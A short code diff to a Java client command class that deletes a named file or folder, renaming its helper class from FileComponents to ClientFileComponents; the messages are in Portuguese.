@@ -4,7 +4,7 @@ package br.com.introcdc.connect.client.commands.file.manipulate;
  */
 
 import br.com.introcdc.connect.client.command.ClientCommand;
-import br.com.introcdc.connect.client.components.FileComponents;
+import br.com.introcdc.connect.client.components.ClientFileComponents;
 
 import java.io.File;
 
@@ -20,12 +20,12 @@ public class ClientCommandDel extends ClientCommand {
             msg("Digite um arquivo ou pasta!");
             return;
         }
-        File file = FileComponents.file(input);
+        File file = ClientFileComponents.file(input);
         if (!file.exists()) {
             msg("Arquivo não encontrado!");
             return;
         }
-        FileComponents.deleteFile(file);
+        ClientFileComponents.deleteFile(file);
         msg("Arquivo " + file.getAbsolutePath() + " apagado!");
     }
 
